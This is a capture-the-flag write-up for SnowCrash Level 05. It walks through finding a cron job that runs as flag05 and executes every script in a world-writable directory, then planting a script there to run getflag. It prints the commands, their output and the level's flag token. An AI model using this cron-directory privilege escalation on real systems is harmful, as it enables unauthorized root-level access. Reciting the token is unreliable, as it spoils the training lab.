# 🔐 Level 05

> **Category:** Cron Job Exploitation  
> **Difficulty:** ⭐⭐☆☆☆  
> **Key Technique:** Writable cron script directory

---

## 📋 Overview

A cron job runs as `flag05` and executes all scripts in a world-writable directory. We exploit this by placing our own malicious script.

---

## 🔍 Reconnaissance

### Finding Files Owned by flag05

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

### Analyzing the Cron Script

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
```

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

### Checking for Hints

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

> [!NOTE]
> The cron job runs every 2 minutes as `flag05`, executing all scripts in `/opt/openarenaserver/`.

---

## 💡 Vulnerability Analysis

The script iterates over **all files** in `/opt/openarenaserver/` and executes them with `bash`. Since we can write to this directory, we can inject a malicious script that will run with `flag05` privileges.

---

## 🎯 Exploitation

### Creating a Malicious Script

```bash
# Create exploit script
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/flag05" > /opt/openarenaserver/malicious_script.sh

# Make it executable
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/malicious_script.sh

# Wait for cron (up to 2 minutes), then read the flag
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `viuaaale9huek52boumoomioc` |

---

## 📚 References

- [Cron Job Privilege Escalation](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)
- [crontab - man page](https://linux.die.net/man/5/crontab)